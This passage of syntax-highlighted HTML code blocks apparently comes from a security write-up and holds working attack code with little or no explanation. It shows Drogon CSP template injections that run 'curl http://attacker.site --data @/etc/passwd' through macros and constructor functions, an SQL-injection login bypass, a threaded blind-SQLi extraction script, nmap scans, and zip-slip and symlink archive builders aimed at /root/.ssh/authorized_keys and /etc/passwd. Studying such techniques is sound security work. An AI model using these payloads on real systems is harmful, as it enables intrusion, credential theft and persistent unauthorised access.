    <span class="token keyword">char</span> file<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"/etc/passwd"</span><span class="token punctuation">,</span> buffer<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token raw-string string">R"(
        mov $2, %%rax;
        lea (%0), %%rdi;
        mov $0, %%rsi;
        syscall;
        
        mov %%rax, %%rdi;
        mov $0, %%rax;
        lea (%1), %%rsi;
        mov $255, %%rdx;
        syscall
    )"</span>
        <span class="token operator">:</span> <span class="token operator">:</span> <span class="token string">"b"</span> <span class="token punctuation">(</span> file <span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"d"</span> <span class="token punctuation">(</span> buffer <span class="token punctuation">)</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
    $$ <span class="token operator">&lt;&lt;</span> buffer<span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token operator">&gt;</span></code></pre>
<pre data-label="Example.csp" class="language-csp" tabindex="0"><code class="language-csp"><span class="token operator">&lt;</span><span class="token operator">%</span>inc #include <span class="token string">"safe.txt"</span> <span class="token operator">%</span><span class="token operator">&gt;</span></code></pre>
<pre data-label="safe.txt" class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"curl http://attacker.site --data @/etc/passwd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<pre class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">STR</span><span class="token expression"><span class="token punctuation">(</span>X<span class="token punctuation">)</span> #X</span></span>
<span class="token comment">// STR(abc) == "abc"</span></code></pre>
<pre class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">GLUE</span><span class="token expression"><span class="token punctuation">(</span>X<span class="token punctuation">,</span> Y<span class="token punctuation">)</span> X </span><span class="token punctuation">##</span> <span class="token expression">Y</span></span>
<span class="token function">GLUE</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> out<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"hello world!"</span> <span class="token operator">&lt;&lt;</span> <span class="token function">GLUE</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> ndl<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// cout &lt;&lt; "hello world!" &lt;&lt; endl;</span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">GLUE2</span><span class="token expression"><span class="token punctuation">(</span>X<span class="token punctuation">)</span> X </span><span class="token punctuation">##</span> <span class="token expression">_literally</span></span>
<span class="token keyword">int</span> <span class="token function">GLUE2</span><span class="token punctuation">(</span>var<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">// int var_literally = 1;</span></code></pre>
<pre class="language-csp" tabindex="0"><code class="language-csp"><span class="token operator">&lt;</span><span class="token operator">%</span>inc #define <span class="token function">GLUE</span><span class="token punctuation">(</span>X<span class="token punctuation">,</span> Y<span class="token punctuation">)</span> X ## Y <span class="token operator">%</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">%</span>c<span class="token operator">++</span>
    <span class="token function">GLUE</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> ystem<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">"curl http://attacker.site --data @/etc/passwd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token operator">&gt;</span></code></pre>
<pre class="language-csp" tabindex="0"><code class="language-csp"><span class="token operator">&lt;</span><span class="token operator">%</span>inc
<span class="token comment">// 1. Assign variable with function call.</span>
<span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"curl http://attacker.site --data @/etc/passwd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 2. To run more code, we can create a function first.</span>
<span class="token keyword">int</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"curl http://attacker.site --data @/etc/passwd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">int</span> b <span class="token operator">=</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 3. GCC attributes - gets called automatically.</span>
<span class="token function">__attribute__</span><span class="token punctuation">(</span><span class="token punctuation">(</span>constructor<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">void</span> <span class="token function">bar</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"curl http://attacker.site --data @/etc/passwd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token operator">%</span><span class="token operator">&gt;</span></code></pre>
<pre data-label="Example.csp" class="language-csp" tabindex="0"><code class="language-csp"><span class="token operator">&lt;</span><span class="token operator">%</span>c<span class="token operator">++</span> 
<span class="token punctuation">}</span> 
<span class="token function">__attribute__</span><span class="token punctuation">(</span><span class="token punctuation">(</span>constructor<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">void</span> <span class="token function">injected</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"curl http://attacker.site --data @/etc/passwd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
std<span class="token double-colon punctuation">::</span>string <span class="token function">dummy</span><span class="token punctuation">(</span><span class="token keyword">const</span> DrTemplateData<span class="token operator">&amp;</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    drogon<span class="token double-colon punctuation">::</span>OStringStream Example_tmp_stream<span class="token punctuation">;</span>
    std<span class="token double-colon punctuation">::</span>string layoutName<span class="token punctuation">{</span><span class="token string">""</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token operator">&gt;</span></code></pre>
<pre data-label="Example.cc" class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token comment">// Boilerplate: includes...</span>
std<span class="token double-colon punctuation">::</span>string <span class="token class-name">Example</span><span class="token double-colon punctuation">::</span><span class="token function">genText</span><span class="token punctuation">(</span><span class="token keyword">const</span> DrTemplateData<span class="token operator">&amp;</span> Example_view_data<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    drogon<span class="token double-colon punctuation">::</span>OStringStream Example_tmp_stream<span class="token punctuation">;</span>
    std<span class="token double-colon punctuation">::</span>string layoutName<span class="token punctuation">{</span><span class="token string">""</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
 
<span class="token punctuation">}</span> 
<span class="token function">__attribute__</span><span class="token punctuation">(</span><span class="token punctuation">(</span>constructor<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">void</span> <span class="token function">injected</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"curl http://attacker.site --data @/etc/passwd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
std<span class="token double-colon punctuation">::</span>string <span class="token function">dummy</span><span class="token punctuation">(</span><span class="token keyword">const</span> DrTemplateData<span class="token operator">&amp;</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    drogon<span class="token double-colon punctuation">::</span>OStringStream Example_tmp_stream<span class="token punctuation">;</span>
    std<span class="token double-colon punctuation">::</span>string layoutName<span class="token punctuation">{</span><span class="token string">""</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token comment">// Boilerplate: convert stream to string and return....</span></code></pre>
<pre class="language-csp" tabindex="0"><code class="language-csp"><span class="token operator">&lt;</span>h1<span class="token operator">&gt;</span>Hi <span class="token punctuation">[</span><span class="token punctuation">[</span>name<span class="token string">"];}}__attribute__((constructor))void/**/injected(){system("</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token string">");}std::string/**/dummy(const/**/DrTemplateData&amp;data){drogon::OStringStream/**/Example_tmp_stream;std::string/**/layoutName{"</span><span class="token string">"};{auto&amp;val=data["</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">&gt;</span></code></pre>
<pre data-label="server.py" data-lang-off="" class="language-python" tabindex="0"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span>
    password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span>

    <span class="token comment"># Check if username/password exists.</span>
    query <span class="token operator">=</span> <span class="token string">"SELECT * FROM users WHERE username='{}' AND password='{}'"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">)</span>
    c <span class="token operator">=</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>
    c<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>query<span class="token punctuation">)</span>
    user <span class="token operator">=</span> c<span class="token punctuation">.</span>fetchone<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> user<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">'Login successful!'</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">'Login failed.'</span></code></pre>
<pre class="language-sql" tabindex="0"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> username<span class="token operator">=</span><span class="token string">''</span> <span class="token operator">OR</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment">-- ' AND password='...'</span></code></pre>
<pre data-lang-off="" class="language-python" tabindex="0"><code class="language-python"><span class="token keyword">import</span> requests

<span class="token keyword">def</span> <span class="token function">check_sql_value</span><span class="token punctuation">(</span>sql_query<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> idx<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span> guess<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">bool</span><span class="token punctuation">:</span>
    url <span class="token operator">=</span> <span class="token string">'http://127.0.0.1:5000/login'</span>
    data <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'1'</span><span class="token punctuation">,</span>
        <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"' OR UNICODE(SUBSTRING(</span><span class="token interpolation"><span class="token punctuation">{</span>sql_query<span class="token punctuation">}</span></span><span class="token string">, </span><span class="token interpolation"><span class="token punctuation">{</span>idx<span class="token punctuation">}</span></span><span class="token string">, 1)) = </span><span class="token interpolation"><span class="token punctuation">{</span>guess<span class="token punctuation">}</span></span><span class="token string"> -- "</span></span>
    <span class="token punctuation">}</span>
    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token string">'success'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text

max_data_len <span class="token operator">=</span> <span class="token number">256</span>
final_data <span class="token operator">=</span> <span class="token string">''</span>

<span class="token comment"># SQL's SUBSTRING uses 1-based indexing.</span>
<span class="token keyword">for</span> idx <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> max_data_len<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> guess <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> check_sql_value<span class="token punctuation">(</span><span class="token string">'sqlite_version()'</span><span class="token punctuation">,</span> idx<span class="token punctuation">,</span> guess<span class="token punctuation">)</span><span class="token punctuation">:</span>
            final_data <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>guess<span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>final_data<span class="token punctuation">)</span>
            <span class="token keyword">break</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token comment"># No valid ASCII chars found. Probably end of string.</span>
        <span class="token keyword">break</span></code></pre>
<pre data-lang-off="" class="language-python" tabindex="0"><code class="language-python"><span class="token keyword">def</span> <span class="token function">binary_search</span><span class="token punctuation">(</span>val<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span> low<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span> high<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">int</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""Binary search for value between low (inclusive) and high (exclusive),
    assuming the guessed value is within range."""</span>
    <span class="token keyword">while</span> low <span class="token operator">&lt;</span> high<span class="token punctuation">:</span>
        mid <span class="token operator">=</span> <span class="token punctuation">(</span>low <span class="token operator">+</span> high<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>
        <span class="token keyword">if</span> low <span class="token operator">==</span> mid<span class="token punctuation">:</span>
            <span class="token keyword">return</span> mid <span class="token comment"># Found val.</span>
        
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">{</span>low<span class="token punctuation">:</span><span class="token format-spec">3</span><span class="token punctuation">}</span></span><span class="token string"> - </span><span class="token interpolation"><span class="token punctuation">{</span>high<span class="token punctuation">:</span><span class="token format-spec">3</span><span class="token punctuation">}</span></span><span class="token string">\tGuess: </span><span class="token interpolation"><span class="token punctuation">{</span>mid<span class="token punctuation">:</span><span class="token format-spec">4</span><span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> val <span class="token operator">&lt;</span> mid<span class="token punctuation">:</span>
            high <span class="token operator">=</span> mid  <span class="token comment"># Eliminate upper half.</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            low <span class="token operator">=</span> mid   <span class="token comment"># Eliminate lower half.</span></code></pre>
<pre class="command-line language-python" data-prompt=">>>" data-filter-output="out>" data-lang-off="" tabindex="0"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'result:'</span><span class="token punctuation">,</span> binary_search<span class="token punctuation">(</span><span class="token number">125</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
out<span class="token operator">&gt;</span>  <span class="token number">0</span> <span class="token operator">-</span> <span class="token number">128</span>       Guess<span class="token punctuation">:</span>   <span class="token number">64</span>
out<span class="token operator">&gt;</span> <span class="token number">64</span> <span class="token operator">-</span> <span class="token number">128</span>       Guess<span class="token punctuation">:</span>   <span class="token number">96</span>
out<span class="token operator">&gt;</span> <span class="token number">96</span> <span class="token operator">-</span> <span class="token number">128</span>       Guess<span class="token punctuation">:</span>  <span class="token number">112</span>
out<span class="token operator">&gt;</span><span class="token number">112</span> <span class="token operator">-</span> <span class="token number">128</span>       Guess<span class="token punctuation">:</span>  <span class="token number">120</span>
out<span class="token operator">&gt;</span><span class="token number">120</span> <span class="token operator">-</span> <span class="token number">128</span>       Guess<span class="token punctuation">:</span>  <span class="token number">124</span>
out<span class="token operator">&gt;</span><span class="token number">124</span> <span class="token operator">-</span> <span class="token number">128</span>       Guess<span class="token punctuation">:</span>  <span class="token number">126</span>
out<span class="token operator">&gt;</span><span class="token number">124</span> <span class="token operator">-</span> <span class="token number">126</span>       Guess<span class="token punctuation">:</span>  <span class="token number">125</span>
out<span class="token operator">&gt;</span>result<span class="token punctuation">:</span> <span class="token number">125</span></code></pre>
<pre data-lang-off="" class="language-python" tabindex="0"><code class="language-python"><span class="token keyword">def</span> <span class="token function">binary_search</span><span class="token punctuation">(</span>sql_query<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> idx<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span> low<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span> high<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">int</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""Find the value of sql_query using binary search, between
    low (inclusive) and high (exclusive). Assuming the guessed value
    is within range."""</span>
    <span class="token keyword">while</span> low <span class="token operator">&lt;</span> high<span class="token punctuation">:</span>
        mid <span class="token operator">=</span> <span class="token punctuation">(</span>low <span class="token operator">+</span> high<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>
        <span class="token keyword">if</span> low <span class="token operator">==</span> mid<span class="token punctuation">:</span>
            <span class="token keyword">return</span> mid <span class="token comment"># Found val.</span>
        
        <span class="token keyword">if</span> check_sql_value<span class="token punctuation">(</span>sql_query<span class="token punctuation">,</span> idx<span class="token punctuation">,</span> mid<span class="token punctuation">)</span><span class="token punctuation">:</span>
            high <span class="token operator">=</span> mid
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            low <span class="token operator">=</span> mid

<span class="token keyword">def</span> <span class="token function">check_sql_value</span><span class="token punctuation">(</span>sql_query<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> idx<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span> guess<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">bool</span><span class="token punctuation">:</span>
    <span class="token comment"># Make web request to check ASCII(SUBSTRING(sql_query, idx, 1)) &lt; guess.</span>
    <span class="token comment"># And then check if the response is a TRUE or FALSE response.</span>
    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>

<span class="token keyword">for</span> idx <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    val <span class="token operator">=</span> binary_search<span class="token punctuation">(</span><span class="token string">"@@version"</span><span class="token punctuation">,</span> idx<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span>
    <span class="token comment"># Handle `val`...</span></code></pre>
<pre data-lang-off="" class="language-python" tabindex="0"><code class="language-python">binary_search<span class="token punctuation">(</span><span class="token string">"@@version"</span><span class="token punctuation">,</span> idx<span class="token punctuation">,</span> low<span class="token punctuation">,</span> high<span class="token punctuation">)</span></code></pre>
<pre data-lang-off="" class="language-python" tabindex="0"><code class="language-python"><span class="token keyword">with</span> concurrent<span class="token punctuation">.</span>futures<span class="token punctuation">.</span>ThreadPoolExecutor<span class="token punctuation">(</span>max_workers<span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token keyword">as</span> executor<span class="token punctuation">:</span>
    future_map <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>

    <span class="token comment"># Create a task for each character.</span>
    <span class="token keyword">for</span> idx <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>
        future <span class="token operator">=</span> executor<span class="token punctuation">.</span>submit<span class="token punctuation">(</span>get_by_bsearch<span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f"ASCII(SUBSTRING((</span><span class="token interpolation"><span class="token punctuation">{</span>sql<span class="token punctuation">}</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">{</span>idx<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">}</span></span><span class="token string">,1))"</span></span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span>
        future_map<span class="token punctuation">[</span>future<span class="token punctuation">]</span> <span class="token operator">=</span> idx

    <span class="token comment"># Handle finished tasks concurrently.</span>
    <span class="token keyword">for</span> future <span class="token keyword">in</span> concurrent<span class="token punctuation">.</span>futures<span class="token punctuation">.</span>as_completed<span class="token punctuation">(</span>future_map<span class="token punctuation">)</span><span class="token punctuation">:</span>
        idx <span class="token operator">=</span> future_map<span class="token punctuation">[</span>future<span class="token punctuation">]</span>
        ch <span class="token operator">=</span> future<span class="token punctuation">.</span>result<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token comment"># We found the character at a particular index!</span>
        <span class="token comment"># Store it somewhere...</span>
        somewhere<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> ch</code></pre>
<pre data-lang-off="" class="language-python" tabindex="0"><code class="language-python">length <span class="token operator">=</span> get_by_bsearch<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"LENGTH((</span><span class="token interpolation"><span class="token punctuation">{</span>sql<span class="token punctuation">}</span></span><span class="token string">))"</span></span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2048</span><span class="token punctuation">)</span></code></pre>
<pre data-lang-off="" class="language-python" tabindex="0"><code class="language-python">sql <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"sqli&gt; "</span><span class="token punctuation">)</span></code></pre>
<pre data-lang-off="" class="language-python" tabindex="0"><code class="language-python">prompt <span class="token operator">=</span> PromptSession<span class="token punctuation">(</span>history<span class="token operator">=</span>FileHistory<span class="token punctuation">(</span><span class="token string">".history"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
sql <span class="token operator">=</span> prompt<span class="token punctuation">.</span>prompt<span class="token punctuation">(</span><span class="token string">"sqli&gt; "</span><span class="token punctuation">)</span></code></pre>
<pre class="language-sh" tabindex="0"><code class="language-sh"><span class="token comment"># By default, only the first 1000 ports are scanned.</span>
nmap <span class="token parameter variable">-sS</span> <span class="token parameter variable">-T4</span> <span class="token punctuation">..</span>.
<span class="token comment"># Run a full port scan in a different tab...</span>
nmap <span class="token parameter variable">-sS</span> <span class="token parameter variable">-T4</span> -p- <span class="token punctuation">..</span>.</code></pre>
<pre data-lang-off="" class="language-text" tabindex="0"><code class="language-text">foo.zip
 data1.csv
 data2.txt
 ...</code></pre>
<pre data-lang-off="" class="language-text" tabindex="0"><code class="language-text">evil-slip.zip
 placeholder.txt
 ../../root/.ssh/authorized_keys</code></pre>
<pre data-lang-off="" class="language-text" tabindex="0"><code class="language-text">/
 app/
	 uploads/
	     placeholder.txt
 root/
     .ssh/
		 authorized_keys</code></pre>
<pre class="language-python" tabindex="0"><code class="language-python"><span class="token keyword">import</span> zipfile

<span class="token keyword">with</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span><span class="token string">"evil-slip.zip"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">zip</span><span class="token punctuation">:</span>
    <span class="token builtin">zip</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"my-ssh-key.pub"</span><span class="token punctuation">,</span> <span class="token string">"../../root/.ssh/authorized_keys"</span><span class="token punctuation">)</span>
    <span class="token comment">#                            filename to store on the archive</span>
    <span class="token comment">#           file to compress from our local file system</span></code></pre>
<pre class="command-line language-shell" data-prompt="$" data-filter-output="out>" tabindex="0"><code class="language-shell"><span class="token function">touch</span> <span class="token punctuation">..</span>/<span class="token punctuation">..</span>/root/.ssh/authorized_keys
out<span class="token operator">&gt;</span>Normally we would run <span class="token variable"><span class="token variable">`</span>ssh-keygen<span class="token variable">`</span></span> to generate a key pair<span class="token punctuation">..</span>.
out<span class="token operator">&gt;</span>and use the generated public key as our authorized_keys.
out<span class="token operator">&gt;</span>But let's assume <span class="token punctuation">..</span>/.ssh/authorized_keys holds a public key.
out<span class="token operator">&gt;</span>
<span class="token function">zip</span> evil-slip <span class="token punctuation">..</span>/<span class="token punctuation">..</span>/root/.ssh/authorized_keys
out<span class="token operator">&gt;</span>  adding: <span class="token punctuation">..</span>/<span class="token punctuation">..</span>/root/.ssh/authorized_keys <span class="token punctuation">(</span>deflated <span class="token number">18</span>%<span class="token punctuation">)</span>
out<span class="token operator">&gt;</span>
<span class="token function">unzip</span> <span class="token parameter variable">-l</span> evil-slip
out<span class="token operator">&gt;</span>Archive:  evil-slip.zip
out<span class="token operator">&gt;</span>  Length      Date    Time    Name
out<span class="token operator">&gt;</span>---------  ---------- -----   ----
out<span class="token operator">&gt;</span>      <span class="token number">575</span>  01-23-2024 <span class="token number">17</span>:53   <span class="token punctuation">..</span>/<span class="token punctuation">..</span>/root/.ssh/authorized_keys
out<span class="token operator">&gt;</span>---------                     -------
out<span class="token operator">&gt;</span>      <span class="token number">575</span>                     <span class="token number">1</span> <span class="token function">file</span></code></pre>
<pre data-lang-off="" class="language-text" tabindex="0"><code class="language-text">evil-link-file.zip
 passwd.txt         -&gt; /etc/passwd</code></pre>
<pre data-lang-off="" class="language-text" tabindex="0"><code class="language-text">app/
 uploads/
	 passwd.txt     -&gt; /etc/passwd</code></pre>
<pre data-lang-off="" class="language-text" tabindex="0"><code class="language-text">evil-link-dir.zip
 dirlink/           -&gt; /root/.ssh/
     authorized_keys</code></pre>
<pre data-lang-off="" class="language-text" tabindex="0"><code class="language-text">/
 app/
	 uploads/
	     dirlink        -&gt; /root/.ssh/
 root/
     .ssh/
		 authorized_keys</code></pre>
<pre class="language-python" tabindex="0"><code class="language-python"><span class="token comment"># evil-link-file.zip</span>
<span class="token comment">#  passwd.txt         -&gt; /etc/passwd</span>
<span class="token keyword">with</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span><span class="token string">"evil-link-file.zip"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">,</span> compression<span class="token operator">=</span>zipfile<span class="token punctuation">.</span>ZIP_DEFLATED<span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">zip</span><span class="token punctuation">:</span>
  <span class="token comment"># This creates a file symlink named `passwd.txt` which links to `/etc/passwd`.</span>
  info <span class="token operator">=</span> zipfile<span class="token punctuation">.</span>ZipInfo<span class="token punctuation">(</span><span class="token string">"passwd.txt"</span><span class="token punctuation">)</span>
  info<span class="token punctuation">.</span>create_system <span class="token operator">=</span> <span class="token number">0</span> <span class="token comment"># Linux =&gt; 0. Windows =&gt; 3.</span>
  info<span class="token punctuation">.</span>external_attr <span class="token operator">=</span> <span class="token punctuation">(</span>stat<span class="token punctuation">.</span>S_IFLNK <span class="token operator">|</span> <span class="token number">0o777</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">16</span> <span class="token comment"># File attributes.</span>
  <span class="token builtin">zip</span><span class="token punctuation">.</span>writestr<span class="token punctuation">(</span>info<span class="token punctuation">,</span> <span class="token string">"/etc/passwd"</span><span class="token punctuation">)</span>  <span class="token comment"># /etc/passwd is the file we want to read.</span></code></pre>
<pre class="language-python" tabindex="0"><code class="language-python"><span class="token comment"># evil-link-dir.zip</span>
<span class="token comment">#  dirlink/           -&gt; /root/.ssh/</span>
<span class="token comment">#      authorized_keys</span>
<span class="token keyword">with</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span><span class="token string">"evil-link-dir.zip"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">,</span> compression<span class="token operator">=</span>zipfile<span class="token punctuation">.</span>ZIP_DEFLATED<span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">zip</span><span class="token punctuation">:</span>
  info <span class="token operator">=</span> zipfile<span class="token punctuation">.</span>ZipInfo<span class="token punctuation">(</span><span class="token string">"dirlink"</span><span class="token punctuation">)</span>
  info<span class="token punctuation">.</span>create_system <span class="token operator">=</span> <span class="token number">0</span>
  info<span class="token punctuation">.</span>external_attr <span class="token operator">=</span> <span class="token punctuation">(</span>stat<span class="token punctuation">.</span>S_IFLNK <span class="token operator">|</span> <span class="token number">0o777</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">16</span>
